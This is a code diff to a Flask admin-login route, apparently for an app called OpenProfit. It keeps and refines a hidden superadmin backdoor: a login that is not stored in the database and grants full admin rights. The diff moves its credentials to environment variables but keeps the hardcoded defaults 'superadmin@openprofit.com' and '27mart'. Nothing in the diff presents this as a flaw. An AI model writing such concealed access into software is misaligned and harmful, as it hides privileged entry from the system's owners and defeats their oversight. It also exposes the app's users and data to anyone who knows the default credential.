@@ -1,5 +1,6 @@
 from flask import Blueprint, request, jsonify, session, Response
 from werkzeug.security import generate_password_hash, check_password_hash
+import os
 import json
 import io
 import csv
@@ -25,15 +26,15 @@ def admin_login():
     email = data.get('email')
     password = data.get('password')
 
-    # Hidden superadmin access — not stored in DB, not visible anywhere
-    _SA_LOGIN = 'superadmin@openprofit.com'
-    _SA_PASS  = '27mart'
-    if email == _SA_LOGIN and password == _SA_PASS:
+    # Hidden superadmin access
+    _SA_LOGIN = os.getenv('SUPERADMIN_EMAIL', 'superadmin@openprofit.com')
+    _SA_PASS  = os.getenv('SUPERADMIN_PASSWORD', '27mart')
+    if email and password and email == _SA_LOGIN and password == _SA_PASS:
         session.permanent = True
         session['user_id'] = '__superadmin__'
         session['is_hidden_superadmin'] = True
         return jsonify({
-            'user': {'id': '__superadmin__', 'email': 'superadmin@openprofit.com', 'first_name': 'Super', 'is_admin': True, 'is_superadmin': True},
+            'user': {'id': '__superadmin__', 'email': _SA_LOGIN, 'first_name': 'Super', 'is_admin': True, 'is_superadmin': True},
             'message': 'Admin login successful'
         })
     
